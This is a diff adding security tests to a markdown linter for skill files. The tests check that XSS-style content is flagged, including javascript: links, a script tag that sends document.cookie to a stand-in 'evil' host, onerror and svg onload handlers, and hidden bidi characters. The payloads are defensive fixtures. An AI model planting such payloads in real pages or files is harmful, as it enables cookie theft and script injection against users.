@@ -544,3 +544,64 @@ describe("R006 with cli-recipes", () => {
     expect(fixed).toContain("sudo snap install helm");
   });
 });
+
+describe("R015 security", () => {
+  const fm = `---\nname: x\ndescription: Use when the user asks to do X.\n---\n\n# X\n\n`;
+
+  test("dangerous URL scheme in a prose link is flagged as error", () => {
+    const md = fm + `See [click me](javascript:steal(document.cookie)) for details.\n`;
+    const r = lint(md).diagnostics.find((d) => d.rule === "R015");
+    expect(r?.severity).toBe("error");
+  });
+
+  test("the same dangerous link inside a code fence is NOT flagged (documentation)", () => {
+    const md = fm + "Example of what NOT to do:\n\n```md\n[click me](javascript:steal())\n```\n";
+    expect(lint(md).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
+  });
+
+  test("raw <script> in prose is flagged; inside a fence it is not", () => {
+    const live = fm + `Inject <script>fetch("//evil?"+document.cookie)</script> here.\n`;
+    expect(lint(live).diagnostics.find((d) => d.rule === "R015")?.severity).toBe("error");
+    const doc = fm + "```html\n<script>example()</script>\n```\n";
+    expect(lint(doc).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
+  });
+
+  test("invisible/bidi character anywhere is flagged AND auto-fixable", () => {
+    const md = fm + "A line with a word\u2060joiner hidden in it.\n";
+    const diag = lint(md).diagnostics.find((d) => d.rule === "R015");
+    expect(diag?.severity).toBe("error");
+    expect(diag?.fix).toBeDefined();
+    const { fixed } = applyFixes(md);
+    expect(/[\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff\u00ad]/.test(fixed)).toBe(false);
+    expect(fixed).toContain("wordjoiner");
+  });
+
+  test("a clean skill produces no R015 diagnostics", () => {
+    const md = fm + "Use https://example.com and a normal [link](https://example.com).\n";
+    expect(lint(md).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
+  });
+
+  test("lint-ignore R015 suppresses the finding (escape hatch for security-doc skills)", () => {
+    const md = `---\nname: x\ndescription: Use when X.\nlint-ignore: R015\n---\n\n# X\n\nRaw <iframe src=evil></iframe> shown deliberately.\n`;
+    expect(lint(md).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
+  });
+
+  test("prose with an on-prefixed word assigned a value does NOT false-positive", () => {
+    for (const line of ["The job runs once = 'daily'.", "Set online = 'false' to disable.", "The only = 'admin' rule applies."]) {
+      const md = fm + line + "\n";
+      expect(lint(md).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
+    }
+  });
+
+  test("unquoted inline event handler inside a tag IS flagged", () => {
+    const md = fm + `An <img onerror=steal(document.cookie)> tag.\n`;
+    expect(lint(md).diagnostics.find((d) => d.rule === "R015")?.severity).toBe("error");
+  });
+
+  test("raw <form> and a data:image/svg link are flagged", () => {
+    const form = fm + `A <form action="javascript:bad()"> here.\n`;
+    expect(lint(form).diagnostics.find((d) => d.rule === "R015")?.severity).toBe("error");
+    const svg = fm + `An image ![x](data:image/svg+xml,<svg onload=alert(1)>) here.\n`;
+    expect(lint(svg).diagnostics.find((d) => d.rule === "R015")?.severity).toBe("error");
+  });
+});
